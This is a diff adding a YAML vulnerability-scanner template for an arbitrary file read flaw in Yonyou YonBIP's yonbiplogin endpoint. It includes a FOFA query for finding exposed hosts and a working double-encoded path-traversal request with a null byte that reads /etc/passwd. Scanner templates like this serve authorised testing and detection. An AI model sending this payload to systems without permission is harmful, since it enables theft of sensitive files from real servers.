@@ -1,0 +1,20 @@
+id: yonyou-yonbip-yonbiplogin-fileread
+
+info:
+  name: 用友YonBIP_yonbiplogin存在任意文件读取漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    YonBIP用友商业创新平台，是用友在数字经济时代面向成长型、大型企业及巨型企业，融合了先进且高可用技术平台和公共与关键商业应用与服务，支撑和运行客户的商业创新（业务创新、管理变革），并且具有数字化、智能化、高弹性、安全可信、社会化、全球化、平台化、生态化等特征的综合型服务平台。用友YonBIP yonbiplogin存在任意文件读取漏洞，攻击者可通过该漏洞获取敏感信息。
+    fofa: title="YonBIP" || title="数字化工作台"
+  tags: yonyou,fileread
+  created: 2024/11/29
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
